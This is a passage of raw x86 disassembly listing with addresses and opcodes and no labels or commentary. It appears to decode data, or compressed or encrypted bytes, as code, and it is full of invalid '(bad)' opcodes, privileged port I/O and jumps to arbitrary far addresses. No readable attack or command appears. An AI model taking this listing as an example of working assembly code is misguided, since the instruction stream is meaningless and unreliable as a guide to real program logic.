  4112eb:	adc    DWORD PTR [esp+esi*2+0x26],edx
  4112ef:	daa    
  4112f0:	pop    ebx
  4112f1:	aas    
  4112f2:	shl    BYTE PTR [ebx-0x4779a3b3],0xb3
  4112f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112fa:	(bad)  
  4112fb:	loope  0x4112e5
  4112fd:	in     eax,0x21
  4112ff:	retw   
  411301:	std    
  411302:	jge    0x411309
  411304:	xor    al,BYTE PTR [ebx-0x3d876149]
  41130a:	in     al,dx
  41130b:	std    
  41130c:	imul   ecx,DWORD PTR [edx+0x41],0xeca2734d
  411313:	ror    DWORD PTR [ebp-0x80],1
  411316:	cs leave 
  411318:	or     ebx,0x53
  41131b:	fwait
  41131c:	es or  eax,0xc6b26414
  411322:	popf   
  411323:	js     0x411339
  411325:	pop    ecx
  411326:	adc    ah,BYTE PTR [ebx+edi*8-0x3f]
  41132a:	dec    esp
  41132b:	xor    cl,BYTE PTR [edi+edx*2-0x892488d]
  411332:	(bad)  
  411333:	into   
  411334:	repz adc BYTE PTR [ebx-0x27084c73],bl
  41133b:	pop    ebp
  41133c:	leave  
  41133d:	sar    DWORD PTR [ebp+0x2f],1
  411340:	dec    ebp
  411341:	inc    eax
  411342:	in     eax,0x4e
  411344:	dec    esi
  411345:	pop    es
  411346:	xchg   si,ax
  411348:	push   edi
  411349:	stc    
  41134a:	dec    ecx
  41134b:	nop
  41134c:	cld    
  41134d:	enter  0xea5b,0x68
  411351:	(bad)
  411355:	icebp  
  411356:	out    0x45,eax
  411358:	ins    BYTE PTR es:[edi],dx
  411359:	stos   DWORD PTR es:[edi],eax
  41135a:	lahf   
  41135b:	mov    ah,0xd
  41135d:	inc    eax
  41135e:	iret   
  41135f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411360:	or     eax,0xa9676c68
  411365:	jl     0x411339
  411367:	loop   0x411331
  411369:	ret    0xf140
  41136c:	jp     0x4113b1
  41136e:	and    DWORD PTR [edi],esp
  411370:	dec    esi
  411371:	sahf   
  411372:	test   eax,0x3778cff
  411377:	add    edi,ebx
  411379:	push   0xffffffb0
  41137b:	xchg   esp,ebx
  41137d:	push   esp
  41137e:	fldcw  WORD PTR fs:[edi-0x52]
  411382:	int3   
  411383:	xor    BYTE PTR [edx+0x30],dl
  411386:	mov    ah,dl
  411388:	pop    ss
  411389:	bound  ebx,QWORD PTR [esi+ebx*8+0x58cbcfb3]
  411390:	adc    ecx,edi
  411392:	out    0x88,eax
  411394:	lahf   
  411395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411396:	mov    bh,BYTE PTR [eax+0x4d]
  411399:	push   es
  41139a:	xchg   ebx,eax
  41139b:	or     DWORD PTR [edx+0x3b],eax
  41139e:	(bad)  
  41139f:	cli    
  4113a0:	(bad)  
  4113a1:	jge    0x41140d
  4113a3:	pop    ss
  4113a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113a5:	push   0x8e6a1681
  4113aa:	sub    al,BYTE PTR [ecx-0x58]
  4113ad:	std    
  4113ae:	pushf  
  4113af:	mov    ch,0x24
  4113b1:	mov    edx,0xee0081b6
  4113b6:	cmp    al,0xd9
  4113b8:	mov    ds:0xd301304d,al
  4113bd:	enter  0xb5cd,0xad
  4113c1:	xor    ah,dh
  4113c3:	sub    al,0x5c
  4113c5:	in     eax,0x6
  4113c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113c8:	ret    
  4113c9:	mul    dh
  4113cb:	pusha  
  4113cc:	xlat   BYTE PTR ds:[ebx]
  4113cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ce:	loop   0x411435
  4113d0:	sub    dl,BYTE PTR [ecx+0x2c]
  4113d3:	mov    edi,0x48a825c9
  4113d8:	dec    eax
  4113d9:	add    eax,0xaa75bf36
  4113de:	adc    DWORD PTR cs:[edi-0xd],esi
  4113e2:	daa    
  4113e3:	push   ss
  4113e4:	mov    al,0x8c
  4113e6:	push   ebp
  4113e7:	or     bl,dh
  4113e9:	addr16 or al,0xf1
  4113ec:	adc    eax,0xd9ef6412
  4113f1:	repz test edx,edx
  4113f4:	arpl   di,cx
  4113f6:	cld    
  4113f7:	adc    al,0x45
  4113f9:	dec    ebp
  4113fa:	or     al,ah
  4113fc:	in     eax,0xcb
  4113fe:	clc    
  4113ff:	nop
  411400:	int    0x7d
  411402:	pop    edi
  411403:	(bad)  
  411404:	push   ebp
  411405:	pop    edx
  411406:	nop
  411407:	fs pop esp
  411409:	fidivr WORD PTR [esp+esi*4+0x31]
  41140d:	and    eax,DWORD PTR [edx+eiz*1+0x2e1e79f8]
  411414:	cdq    
  411415:	ins    DWORD PTR es:[edi],dx
  411416:	push   ecx
  411417:	mov    edx,0x298e4989
  41141c:	(bad)  
  41141d:	lea    ebx,ds:0x7ae002c5
  411423:	stos   DWORD PTR es:[edi],eax
  411424:	pop    ecx
  411425:	cwde   
  411426:	or     ecx,DWORD PTR [edi]
  411428:	int3   
  411429:	xchg   DWORD PTR [ebp+0x15b9192b],eax
  41142f:	and    esp,ebx
  411431:	xchg   DWORD PTR [esi-0x7d],ebp
  411434:	loop   0x4113c1
  411436:	bnd jnp 0x411404
  411439:	shl    BYTE PTR [ecx-0x348c196f],cl
  41143f:	std    
  411440:	xor    eax,0x983e478d
  411445:	dec    esi
  411446:	jno    0x411415
  411448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411449:	sbb    ch,ah
  41144b:	mov    ebp,0x36935618
  411450:	das    
  411451:	sti    
  411452:	pop    esi
  411453:	push   0xffffff88
  411455:	mov    ebx,DWORD PTR [edx+0x4cf29b1a]
  41145b:	sahf   
  41145c:	and    BYTE PTR [edx],dh
  41145e:	and    cl,BYTE PTR ss:[edx]
  411461:	out    0x98,al
  411463:	jge    0x4114ba
  411465:	jge    0x4113f9
  411467:	push   edi
  411468:	xor    al,0x3a
  41146a:	pop    edx
  41146b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146c:	push   edx
  41146d:	dec    ebx
  41146e:	lods   eax,DWORD PTR ds:[esi]
  41146f:	or     ebx,DWORD PTR [edi-0x778ec438]
  411475:	test   al,0x2d
  411477:	mov    al,ds:0xbfd2dc1e
  41147c:	and    BYTE PTR [edx-0x6d],al
  41147f:	js     0x41146d
  411481:	es jne 0x41145f
  411484:	cmp    eax,0x52690e90
  411489:	outs   dx,BYTE PTR ds:[esi]
  41148a:	in     al,dx
  41148b:	not    ah
  41148d:	add    al,0x64
  41148f:	test   DWORD PTR [ecx],ecx
  411491:	loopne 0x411465
  411493:	jp     0x4114f8
  411495:	or     DWORD PTR [eax+0x20aed233],0x4d
  41149c:	dec    ecx
  41149d:	adc    eax,ebx
  41149f:	ret    0x3de3
  4114a2:	dec    ecx
  4114a3:	sbb    ebx,DWORD PTR [ebx+eiz*2]
  4114a6:	fcmovu st,st(3)
  4114a8:	in     eax,0x93
  4114aa:	dec    edx
  4114ab:	inc    eax
  4114ac:	dec    ecx
  4114ad:	ret    
  4114ae:	dec    edi
  4114af:	out    dx,eax
  4114b0:	test   BYTE PTR [ecx],0x59
  4114b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b4:	into   
  4114b5:	pop    ebx
  4114b6:	push   edx
  4114b7:	push   eax
  4114b8:	std    
  4114b9:	pop    ss
  4114ba:	dec    edi
  4114bb:	mov    dl,cl
  4114bd:	data16 cli 
  4114bf:	sub    eax,0xd7c930
  4114c4:	push   esi
  4114c5:	in     eax,0x7e
  4114c7:	adc    eax,0x982afa2c
  4114cc:	pop    ds
  4114cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114ce:	jbe    0x41153f
  4114d0:	push   eax
  4114d1:	add    cl,dl
  4114d3:	mov    cl,BYTE PTR [edi]
  4114d5:	sub    DWORD PTR [eax+0x25],esp
  4114d8:	xor    DWORD PTR [ebx+edx*8+0x64e573b2],ebp
  4114df:	mov    bh,0x1b
  4114e1:	inc    esi
  4114e2:	repz adc BYTE PTR [ebx+0x78],ah
  4114e6:	cdq    
  4114e7:	pop    edi
  4114e8:	ja     0x4114dc
  4114ea:	jno    0x411483
  4114ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ed:	push   ss
  4114ee:	data16 rcl BYTE PTR [edi+0x78ec19f],cl
  4114f5:	dec    ebx
  4114f6:	adc    ebx,esp
  4114f8:	add    eax,0xd30b963e
  4114fd:	push   edi
  4114fe:	sbb    dh,BYTE PTR [esi]
  411500:	push   eax
  411501:	push   ebp
  411502:	lahf   
  411503:	lea    esp,[ecx+0x7add146f]
  411509:	int3   
  41150a:	arpl   WORD PTR [ecx+0x177be0b4],bx
  411510:	mov    edx,0xc33fbf9d
  411515:	fwait
  411516:	rcl    dl,1
  411518:	or     eax,0xc5ba6d9c
  41151d:	mov    dl,0x99
  41151f:	popf   
  411520:	sahf   
  411521:	fwait
  411522:	add    BYTE PTR [eax+0x20c261d0],bl
  411528:	xor    esi,DWORD PTR [edi+ebp*4-0x41]
  41152c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41152d:	test   al,0x57
  41152f:	or     DWORD PTR [ecx-0x69],edx
  411532:	inc    ecx
  411533:	cmp    BYTE PTR [ecx-0x28],cl
  411536:	je     0x411577
  411538:	sbb    DWORD PTR [edx+0x33],edx
  41153b:	push   es
  41153c:	cmp    eax,DWORD PTR [esi-0x20879071]
  411542:	cli    
  411543:	les    ecx,FWORD PTR [eax+eiz*4]
  411546:	xchg   edi,eax
  411547:	inc    edx
  411548:	fnstcw WORD PTR [edi]
  41154a:	cdq    
  41154b:	cmp    dh,dl
  41154d:	rcr    dh,1
  41154f:	daa    
  411550:	(bad)  
  411551:	and    al,0x4c
  411553:	test   al,0x1d
  411555:	(bad)  
  411557:	push   ebp
  411558:	jg     0x41158a
  41155a:	imul   edi,ebp,0x24
  41155d:	sub    edi,DWORD PTR [ebp-0x7e]
  411560:	inc    esi
  411561:	and    BYTE PTR [esi-0x20],cl
  411564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411565:	sbb    cl,bl
  411567:	dec    ecx
  411568:	adc    BYTE PTR [ebx-0x34be454],al
  41156e:	dec    ebx
  41156f:	shl    esp,cl
  411571:	cld    
  411572:	dec    edx
  411573:	imul   eax,DWORD PTR [eax-0x26e7e910],0x8174964d
  41157d:	dec    esp
  41157e:	sbb    ecx,eax
  411580:	add    DWORD PTR [edi-0x14],ebx
  411583:	dec    edi
  411584:	test   al,0x46
  411586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411587:	push   esp
  411588:	adc    BYTE PTR [edi],bh
  41158a:	adc    dh,bl
  41158c:	adc    esp,DWORD PTR [eax]
  41158e:	dec    eax
  41158f:	pop    esi
  411590:	fidiv  WORD PTR [ebx]
  411592:	push   ebx
  411593:	lahf   
  411594:	out    0x66,al
  411596:	mov    ah,0x40
  411598:	js     0x411574
  41159a:	lods   al,BYTE PTR ds:[esi]
  41159b:	std    
  41159c:	clc    
  41159d:	inc    esp
  41159e:	sub    BYTE PTR [esi],bl
  4115a0:	fwait
  4115a1:	jl     0x411582
  4115a3:	stos   DWORD PTR es:[edi],eax
  4115a4:	dec    edx
  4115a5:	fwait
  4115a6:	xlat   BYTE PTR ds:[ebx]
  4115a7:	jbe    0x411547
  4115a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115aa:	or     al,0x82
  4115ac:	rcr    BYTE PTR ds:0x3ae37ede,0x63
  4115b3:	push   esp
  4115b4:	test   eax,0x5e18fba8
  4115b9:	jecxz  0x411568
  4115bb:	lahf   
  4115bc:	push   0xffffff80
  4115be:	xchg   edi,eax
  4115bf:	xor    al,0x15
  4115c1:	mov    ebx,0xe9d8480
  4115c6:	test   al,0xab
  4115c8:	ja     0x4115a3
  4115ca:	inc    esi
  4115cb:	add    eax,0xf0ec295d
  4115d0:	lods   eax,DWORD PTR ds:[esi]
  4115d1:	das    
  4115d2:	pop    esp
  4115d3:	sar    DWORD PTR [ecx-0x3b143213],1
  4115d9:	jmp    0x411586
  4115db:	es loop 0x41156c
  4115de:	push   0xffffffbb
  4115e0:	and    ch,cl
  4115e2:	dec    ebp
  4115e3:	xor    eax,0x2cbad4c5
  4115e8:	rcr    BYTE PTR [esi],cl
  4115ea:	mov    ah,0xe8
  4115ec:	or     BYTE PTR [esi],dh
  4115ee:	xchg   esp,eax
  4115ef:	xchg   esp,eax
  4115f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115f1:	xor    esi,DWORD PTR [ebx]
  4115f3:	mov    eax,ds:0x4f3a62bd
  4115f8:	ret    0xf263
  4115fb:	daa    
  4115fc:	leave  
  4115fd:	xchg   esi,eax
  4115fe:	add    al,0xe3
  411600:	inc    esi
  411601:	or     cl,ch
  411603:	mov    BYTE PTR [ebp+0x43],bl
  411606:	arpl   cx,dx
  411608:	loop   0x4115a0
  41160a:	or     ebx,ecx
  41160c:	push   esp
  41160d:	mov    bh,ah
  41160f:	fst    st(3)
  411611:	mov    al,ds:0xea6a1078
  411616:	stos   BYTE PTR es:[edi],al
  411617:	jge    0x4115d0
  411619:	xchg   edi,eax
  41161a:	inc    eax
  41161b:	mov    al,ds:0x547200a5
  411620:	cmp    DWORD PTR [ebx+0x2],eax
  411623:	retf   
  411624:	fistp  DWORD PTR [edx-0x40]
  411627:	outs   dx,DWORD PTR ds:[esi]
  411628:	pop    es
  411629:	push   ecx
  41162a:	mov    ch,0xa1
  41162c:	mov    ds:0x7c8262fb,eax
  411631:	test   BYTE PTR [edx],dh
  411633:	or     DWORD PTR [edx+ecx*1+0x7a420b23],edx
  41163a:	push   edi
  41163b:	cmp    eax,0x3fc192e9
  411640:	or     eax,ebp
  411642:	out    0xe,eax
  411644:	call   0x6d01:0xb82311f6
  41164b:	cmp    esp,DWORD PTR [edx-0x1a]
  41164e:	stc    
  41164f:	mov    dh,BYTE PTR [eax]
  411651:	jbe    0x4116b8
  411653:	(bad)  
  411654:	cmp    DWORD PTR [edx],esi
  411656:	popf   
  411657:	cli    
  411658:	ficomp WORD PTR [edx-0x2b]
  41165b:	mov    dl,0x58
  41165d:	fld    st(0)
  41165f:	xchg   edx,eax
  411661:	and    al,0x16
  411663:	inc    ecx
  411664:	add    DWORD PTR [esi-0x743ef990],edi
  41166a:	retf   0x23
  41166d:	mov    edx,0x5b7db0ed
  411672:	nop
  411673:	les    ebp,FWORD PTR [ebx+0x6cfc680e]
  411679:	in     al,0x1f
  41167b:	mov    ah,0xe7
  41167d:	jge    0x411632
  41167f:	push   ebp
  411680:	fist   WORD PTR [esi-0x1536b400]
  411686:	test   al,0x12
  411688:	cmc    
  411689:	ss out 0xc5,eax
  41168c:	pop    es
  41168d:	je     0x4116b8
  41168f:	cmp    DWORD PTR [edi+0x13811b74],edi
  411695:	mov    esi,0xaff89471
  41169a:	adc    cl,bh
  41169c:	aas    
  41169d:	arpl   WORD PTR [edi],di
  41169f:	jge    0x4116dc
  4116a1:	push   ds
  4116a2:	push   ebx
  4116a3:	xor    al,0x2b
  4116a5:	cmp    edi,eax
  4116a7:	cmp    dh,BYTE PTR [eax]
  4116a9:	(bad)  
  4116aa:	fistp  QWORD PTR [edx-0x1d]
  4116ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ae:	xchg   ebx,eax
  4116af:	test   eax,0xa0aec2f0
  4116b4:	or     edx,DWORD PTR [eax-0x7d]
  4116b7:	test   al,0x9e
  4116b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ba:	jmp    0x5593:0xd18fa0bc
  4116c1:	pop    ecx
  4116c2:	ret    0xdb28
  4116c5:	js     0x4116f1
  4116c7:	jg     0x411654
  4116c9:	adc    esi,eax
  4116cb:	mov    WORD PTR [esi-0x6e],?
  4116ce:	sub    ch,BYTE PTR [eax]
  4116d0:	adc    BYTE PTR [esi+0x6363e639],dl
  4116d6:	aaa    
  4116d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116d8:	jns    0x411710
  4116da:	mov    ebp,0x53c889b2
  4116df:	cmp    DWORD PTR [edx-0x20f1cda],ebx
  4116e5:	add    DWORD PTR [ebx-0x55],edi
  4116e8:	xchg   ebx,eax
  4116e9:	adc    al,0xd6
  4116eb:	jno    0x4116d7
  4116ed:	pop    es
  4116ee:	inc    edx
  4116ef:	lods   eax,DWORD PTR ds:[esi]
  4116f0:	fisubr DWORD PTR [edx-0x546b2c0e]
  4116f6:	gs enter 0xb053,0x8f
  4116fb:	jbe    0x4116dd
  4116fd:	jge    0x411761
  4116ff:	and    edx,DWORD PTR [eax]
  411701:	jae    0x4116e3
  411703:	or     dl,dl
  411705:	jg     0x4116b5
  411707:	out    dx,eax
  411708:	jae    0x4116cb
  41170a:	stos   DWORD PTR es:[edi],eax
  41170b:	or     ebp,ebp
  41170d:	cld    
  41170e:	stc    
  41170f:	enter  0x1f97,0xca
  411713:	jle    0x411732
  411715:	sub    ch,BYTE PTR [edi+0x47978ffb]
  41171b:	jmp    0x1eb:0xaceea56
  411722:	sbb    eax,0x18bbaad5
  411727:	cwde   
  411728:	mov    dl,0x96
  41172a:	lods   eax,DWORD PTR ds:[esi]
  41172b:	xchg   esp,eax
  41172c:	push   ecx
  41172d:	cmc    
  41172e:	dec    BYTE PTR [ecx+edi*2-0x4971a316]
  411735:	mov    eax,0x9947d9de
  41173a:	lahf   
  41173b:	jns    0x411731
  41173d:	mov    DWORD PTR [esi],eax
  41173f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411740:	in     eax,dx
  411741:	test   BYTE PTR [eax+eax*8],0x99
  411745:	push   eax
  411746:	xlat   BYTE PTR ds:[ebx]
  411747:	xor    al,0x7b
  411749:	mov    BYTE PTR [eax-0x4f],0xab
  41174d:	(bad)
  411751:	sbb    DWORD PTR [esi-0x1bf1b3ac],ebp
  411757:	jbe    0x4117a8
  411759:	sbb    eax,DWORD PTR [ebx]
  41175b:	jmp    DWORD PTR [ecx]
  41175d:	xchg   edx,eax
  41175e:	sub    eax,0xc30d17cb
  411763:	data16 (bad) 
  411765:	push   ecx
  411766:	mov    ds:0xec01589f,al
  41176b:	pusha  
  41176c:	fidivr WORD PTR [esi-0x6f]
  41176f:	test   al,0xa9
  411771:	mov    WORD PTR [eax+0xc9c795a],ss
  411777:	dec    esp
  411778:	cdq    
  411779:	repz shr cl,1
  41177c:	call   0x5201:0x4cc1bc1f
  411783:	imul   esp,DWORD PTR ds:0xd32d9355,0xbeab8cfa
  41178d:	mov    esi,0x7d72eb0a
  411792:	loope  0x41176f
  411794:	test   al,0xd3
  411796:	jno    0x41172c
  411798:	pop    esi
  411799:	js     0x411721
  41179b:	mov    ds:0x529e822a,al
  4117a0:	pop    eax
  4117a1:	stos   DWORD PTR es:[edi],eax
  4117a2:	and    DWORD PTR [ebx-0x449b0da],0xfffffff4
  4117a9:	xchg   edi,eax
  4117aa:	sbb    ebx,eax
  4117ac:	push   ss
  4117ad:	mov    ebx,DWORD PTR [ecx+ebx*4-0x66]
  4117b1:	stos   BYTE PTR es:[edi],al
  4117b2:	jg     0x4117d6
  4117b4:	adc    al,0x67
  4117b6:	rcl    BYTE PTR [edx],1
  4117b8:	sub    DWORD PTR [ebp-0x42173115],edx
  4117be:	(bad)  
  4117bf:	fnsave [edi]
  4117c1:	jb     0x41178a
  4117c3:	xor    edi,DWORD PTR [edx]
  4117c5:	call   0x5848:0xeb1c5d19
  4117cc:	adc    al,0x1
  4117ce:	aaa    
  4117cf:	mov    ebx,0xa2985ce7
  4117d4:	stos   DWORD PTR es:[edi],eax
  4117d5:	xchg   esp,eax
  4117d6:	push   esp
  4117d7:	fmul   DWORD PTR [edx+0x44]
  4117da:	pop    ebx
  4117db:	aam    0xda
  4117dd:	lods   eax,DWORD PTR ds:[esi]
  4117de:	add    esi,ebp
  4117e0:	popa   
  4117e1:	into   
  4117e2:	push   cs
  4117e3:	fdivr  st(5),st
  4117e5:	pop    eax
  4117e6:	pusha  
  4117e7:	mov    eax,ds:0x52087b
  4117ec:	ucomiss xmm7,DWORD PTR [ebp+0x4c99cf53]
  4117f3:	scas   eax,DWORD PTR es:[edi]
  4117f4:	daa    
  4117f5:	mov    ds:0xb508333c,eax
  4117fa:	mul    ch
  4117fc:	xor    bh,BYTE PTR [edx-0x43e1d085]
  411802:	mov    ds:0x9cc722c7,eax
  411807:	mov    edi,0x6709812f
  41180c:	mov    bl,BYTE PTR [eax]
  41180e:	(bad)  
  41180f:	mov    bh,0xc6
  411811:	cmp    eax,0xa5e7a9ae
  411816:	and    ah,BYTE PTR [ecx+eiz*2+0x2ed0a386]
  41181d:	push   edx
  41181e:	mov    fs,edi
  411820:	mov    esi,0x148c64d7
  411825:	dec    eax
  411826:	or     eax,0x75cc61e8
  41182b:	fs aaa 
  41182d:	inc    eax
  41182e:	xor    DWORD PTR [ebx+ecx*4+0x66c0140e],0x8
  411836:	test   DWORD PTR [edx],ecx
  411838:	lock test BYTE PTR [ecx+0x7e5f97ef],ah
  41183f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411840:	add    DWORD PTR [eax],edi
  411842:	cmp    DWORD PTR [ecx],esp
  411844:	stc    
  411845:	jae    0x4117e0
  411847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411848:	add    eax,0x1b38beb1
  41184d:	ins    DWORD PTR es:[edi],dx
  41184e:	repz jmp 0x78eee25c
  411854:	into   
  411855:	pop    ds
  411856:	cmp    eax,esp
  411858:	adc    eax,0xf1b6f239
  41185d:	or     al,0x40
  41185f:	xchg   ebx,ecx
  411861:	mov    ebp,0xddf9bef8
  411866:	cmp    al,0x60
  411868:	or     ebp,DWORD PTR [edi+0x69d200fc]
  41186e:	mov    WORD PTR [eax+ecx*1],?
  411871:	into   
  411872:	fld    QWORD PTR [esi]
  411874:	xor    dh,BYTE PTR [ebx-0x7ea6ef39]
  41187a:	stos   BYTE PTR es:[edi],al
  41187b:	mov    esp,DWORD PTR ds:0x258a3073
  411881:	leave  
  411882:	fdiv   st(3),st
  411884:	ss and ebp,eax
  411887:	ja     0x4118e2
  411889:	inc    ebp
  41188a:	adc    cl,BYTE PTR [eax-0x9e8be27]
  411890:	adc    edx,DWORD PTR [esi]
  411892:	push   0x821136d6
  411897:	cmp    esi,edi
  411899:	mov    bl,0x7e
  41189b:	sub    eax,0xe5a06d66
  4118a0:	stos   BYTE PTR es:[edi],al
  4118a1:	jmp    0x4118be
  4118a3:	add    esp,DWORD PTR [esi+0x7920b432]
  4118a9:	ror    DWORD PTR ds:0xfa5862f3,cl
  4118af:	or     al,0xfc
  4118b1:	cmp    eax,0x5c079712
  4118b6:	pop    ecx
  4118b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118b8:	sbb    eax,0xa2743772
  4118bd:	mov    DWORD PTR [edx],0xa2cb6940
  4118c3:	scas   al,BYTE PTR es:[edi]
  4118c4:	not    DWORD PTR [ecx+0x73f065d7]
  4118ca:	ds retf 
  4118cc:	or     eax,0x92532fc1
  4118d1:	dec    edi
  4118d2:	pop    es
  4118d3:	repnz fs (bad) 
  4118d7:	cs pop ss
  4118d9:	repnz fimul WORD PTR [edi]
  4118dc:	or     BYTE PTR [edi-0x44],0xe9
  4118e0:	cdq    
  4118e1:	fnstcw WORD PTR [ecx]
  4118e3:	icebp  
  4118e4:	sub    edi,DWORD PTR [edi+0x51769aec]
  4118ea:	stos   BYTE PTR es:[edi],al
  4118eb:	ins    DWORD PTR es:[edi],dx
  4118ec:	fiadd  WORD PTR gs:[ecx-0x36dfbd9b]
  4118f3:	nop
  4118f4:	xchg   ecx,eax
  4118f5:	cmp    DWORD PTR [esi-0x490c8544],edx
  4118fb:	rcr    DWORD PTR [edi],0x3f
  4118fe:	sbb    DWORD PTR [esi-0x1efb1562],ebx
  411904:	mov    ecx,0x81de665c
  411909:	daa    
  41190a:	rol    DWORD PTR [edi],1
  41190c:	add    al,0xc9
  41190f:	push   ecx
  411910:	cmp    eax,0x4731f9f3
  411915:	mov    edx,0x462911c2
  41191a:	in     al,0xbb
  41191c:	and    ebp,DWORD PTR [edx]
  41191e:	sbb    BYTE PTR [ebx-0xe],bh
  411921:	sub    esi,DWORD PTR [esi+0xb]
  411924:	jp     0x411963
  411926:	mov    ds:0xcdfc5e87,al
  41192b:	mov    al,0xc7
  41192d:	pushf  
  41192e:	xchg   esp,eax
  41192f:	dec    ebx
  411930:	add    al,0x8d
  411932:	fbstp  TBYTE PTR [ebx+esi*4+0x12]
  411936:	xor    al,0xb8
  411938:	pushf  
  411939:	jb     0x411976
  41193b:	xchg   ecx,eax
  41193c:	push   esp
  41193d:	addr16 jl 0x4118e6
  411940:	dec    esi
  411941:	or     al,0x22
  411943:	inc    ebp
  411944:	xor    al,0xa4
  411946:	and    al,0x8a
  411948:	jo     0x411959
  41194a:	mov    ds:0x234a3a4e,al
  41194f:	popf   
  411950:	test   eax,0x8f7652f3
  411955:	addr16 add al,0x4f
  411958:	shr    DWORD PTR [ebx],1
  41195a:	mov    eax,ds:0x89f557c0
  41195f:	mov    ch,BYTE PTR [edi]
  411961:	shl    BYTE PTR [eax+0x60b8a45e],0x16
  411968:	push   eax
  411969:	pop    edx
  41196a:	push   edi
  41196b:	fldpi  
  41196d:	repnz cmp BYTE PTR [ebx],bh
  411970:	lods   eax,DWORD PTR ds:[esi]
  411971:	push   edx
  411972:	jp     0x4119e2
  411974:	(bad)  
  411975:	adc    DWORD PTR ds:0xc38fb66f,edx
  41197b:	(bad)  
  41197c:	pop    ebp
  41197d:	cli    
  41197e:	and    esp,DWORD PTR [ebx+0xe]
  411981:	imul   ebp,esi,0xffffffb0
  411984:	mov    al,ds:0xea083b49
  411989:	cmovp  esp,edx
  41198c:	fcomp  DWORD PTR [ecx+0x98b1671]
  411992:	or     al,BYTE PTR [edi]
  411994:	mov    ch,0xc3
  411996:	cmp    ecx,ecx
  411998:	sar    edi,cl
  41199a:	pop    es
  41199b:	ret    0xee8e
  41199e:	mov    bl,0xc3
  4119a0:	icebp  
  4119a1:	cmc    
  4119a2:	mov    ebx,0x21c5eaa9
  4119a7:	adc    dl,ch
  4119a9:	jo     0x411950
  4119ab:	imul   edi,DWORD PTR [edx],0x75
  4119ae:	out    dx,eax
  4119af:	mov    esp,0x8c70861d
  4119b4:	adc    eax,0x96655c5
  4119b9:	mov    edi,0x40adb441
  4119be:	call   0xbcb98e7a
  4119c3:	aam    0xb4
  4119c5:	movq   QWORD PTR [ebp+0x38],mm0
  4119c9:	mov    ds:0x19e7744f,al
  4119ce:	adc    al,0x25
  4119d0:	jp     0x4119a3
  4119d2:	scas   al,BYTE PTR es:[edi]
  4119d3:	aas    
  4119d4:	out    dx,al
  4119d5:	adc    BYTE PTR [ebp+0x2c23e9ce],bh
  4119db:	cmp    ecx,DWORD PTR [ecx+edi*8-0x51375d6a]
  4119e2:	mov    dh,0x24
  4119e4:	adc    al,0x81
  4119e6:	push   ebp
  4119e7:	(bad)  
  4119e9:	call   0xa4e0:0xf114cbeb
  4119f0:	sar    edi,cl
  4119f2:	cmp    al,BYTE PTR [ecx]
  4119f4:	mov    ds:0x54b5eb9c,al
  4119f9:	add    al,0x85
  4119fb:	popf   
  4119fc:	jmp    0xf9ec9f60
  411a01:	les    edi,FWORD PTR [esp]
  411a04:	adc    DWORD PTR [ebp-0x10],eax
  411a07:	push   0xcbc4286d
  411a0c:	cmp    ebp,ebx
  411a0e:	sahf   
  411a0f:	push   ds
  411a10:	mov    esp,fs
  411a12:	mov    DWORD PTR [ebp-0xbee7a7b],edx
  411a18:	lods   eax,DWORD PTR ds:[esi]
  411a19:	mov    al,ds:0xf8a250e5
  411a1e:	jae    0x411a5a
  411a20:	cmp    al,ah
  411a22:	dec    esp
  411a23:	push   0x5d
  411a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a26:	je     0x411aa1
  411a28:	nop
  411a29:	sbb    BYTE PTR [edi-0x5e],al
  411a2c:	repz das 
  411a2e:	adc    al,0x9d
  411a30:	push   cs
  411a31:	adc    esp,DWORD PTR [ebx+0x51]
  411a34:	ds cmp eax,0x6b9cbc64
  411a3a:	push   ebp
  411a3b:	loopne 0x411a11
  411a3d:	lods   eax,DWORD PTR ds:[esi]
  411a3e:	inc    eax
  411a3f:	stos   BYTE PTR es:[edi],al
  411a40:	pop    bx
  411a42:	out    dx,al
  411a43:	dec    edx
  411a44:	hlt    
  411a45:	mov    dl,0x35
  411a47:	jge    0x4119cc
  411a49:	mov    ah,0x9e
  411a4b:	out    0x27,eax
  411a4d:	mov    dh,0x77
  411a4f:	inc    ebx
  411a50:	cmc    
  411a51:	jge    0x411ab5
  411a53:	sub    eax,DWORD PTR [eax+0x48239ff1]
  411a59:	sub    al,cl
  411a5b:	xchg   eax,ebp
  411a5d:	dec    esp
  411a5e:	icebp  
  411a5f:	btc    edx,ebx
  411a62:	mov    esi,DWORD PTR [eax-0x2ef97891]
  411a68:	lahf   
  411a69:	das    
  411a6a:	ret    
  411a6b:	out    0x93,eax
  411a6d:	cs pop ds
  411a6f:	inc    eax
  411a70:	cli    
  411a71:	stos   BYTE PTR es:[edi],al
  411a72:	mov    al,BYTE PTR [ebp+edx*4-0x18]
  411a76:	cmp    dl,al
  411a78:	ds jmp 0x411add
  411a7b:	and    eax,0x8f18120c
  411a80:	push   cs
  411a81:	cs je  0x411a72
  411a84:	popf   
  411a85:	and    al,0x43
  411a87:	mov    ah,0x7e
  411a89:	bnd jmp 0x2f3ca007
  411a8f:	call   0x348d5850
  411a94:	jecxz  0x411a74
